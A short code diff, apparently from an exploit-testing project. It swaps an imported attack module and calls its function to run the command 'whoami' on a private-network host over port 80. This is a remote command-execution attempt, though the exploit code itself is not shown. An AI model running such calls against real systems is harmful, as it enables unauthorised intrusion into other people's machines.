@@ -1,3 +1,3 @@
-from samples import shit_upload
+from samples import shit_update
 
-shit_upload.shit('172.20.110.101','80','whoami')
+shit_update.shit('192.168.2.131','80','whoami')
